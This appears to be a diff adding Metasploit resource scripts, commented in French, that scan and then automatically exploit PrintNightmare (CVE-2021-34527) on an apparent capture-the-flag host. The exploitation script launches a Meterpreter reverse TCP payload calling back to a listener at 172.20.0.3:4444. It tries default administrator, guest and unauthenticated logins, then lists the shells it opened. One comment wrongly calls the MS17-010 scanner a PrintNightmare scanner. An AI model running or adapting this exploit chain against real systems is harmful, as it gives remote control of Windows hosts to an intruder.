@@ -1,0 +1,79 @@
+# Scanner complet pour Print Nightmare
+echo "[+] Démarrage scan Print Nightmare..."
+
+# Scanner SMB version
+use auxiliary/scanner/smb/smb_version
+set RHOSTS printnightmare.thm
+set THREADS 10
+run
+
+# Enumération des partages SMB
+use auxiliary/scanner/smb/smb_enumshares
+set RHOSTS printnightmare.thm
+set THREADS 5
+run
+
+# Enumération des utilisateurs SMB
+use auxiliary/scanner/smb/smb_enumusers
+set RHOSTS printnightmare.thm
+run
+
+# Scanner Print Spooler
+use auxiliary/scanner/dcerpc/endpoint_mapper
+set RHOSTS printnightmare.thm
+run
+
+# Audit DCERPC
+use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
+set RHOSTS printnightmare.thm
+run
+
+# Scanner spécifique Print Nightmare
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS printnightmare.thm
+run
+
+# Scanner vulnérabilités SMB
+use auxiliary/scanner/smb/smb_enumshares
+set RHOSTS printnightmare.thm
+set ShowFiles true
+run
+
+echo "[+] Scan Print Nightmare terminé"
+echo "[+] Vérifiez les résultats pour les vulnérabilités détectées"
+
+# metasploit/scripts/printnightmare_exploit_auto.rc
+# Script automatique d'exploitation Print Nightmare
+echo "[+] Script d'exploitation automatique Print Nightmare"
+
+# Phase 1: Reconnaissance
+resource /opt/scripts/printnightmare_scanner.rc
+
+# Phase 2: Tentative d'exploitation
+echo "[+] Tentative d'exploitation automatique..."
+
+use exploit/windows/dcerpc/cve_2021_34527_printnightmare
+set RHOSTS printnightmare.thm
+set RPORT 445
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 172.20.0.3
+set LPORT 4444
+set ExitOnSession false
+
+# Tentative avec credentials par défaut
+set SMBUser administrator
+set SMBPass password
+exploit -j
+
+# Tentative avec guest
+set SMBUser guest
+set SMBPass ""
+exploit -j
+
+# Tentative sans authentification
+unset SMBUser
+unset SMBPass
+exploit -j
+
+echo "[+] Exploitation terminée - vérifiez les sessions ouvertes"
+sessions -l
